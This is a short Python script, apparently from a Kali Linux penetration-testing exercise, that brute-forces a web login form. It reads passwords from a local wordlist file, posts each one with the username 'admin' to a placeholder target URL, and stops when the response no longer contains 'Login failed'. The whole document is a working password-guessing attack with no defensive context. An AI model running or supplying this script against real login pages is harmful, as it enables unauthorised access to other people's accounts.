import requests

target_url = "Put the target url here"
data_dictionary = {"username": "admin", "password":"", "Login": "submit"}


with open("/home/kali/Desktop/password.txt", "r") as werdlist_file:
    for line in werdlist_file:
        word = line.strip()
        data_dictionary["password"] = word
        response = requests.post(target_url, data=data_dictionary)
        if "Login failed" not in response.content.decode():
            print("[+] Found the password --> " + word)
            exit()
            
print("[+] The program is done.")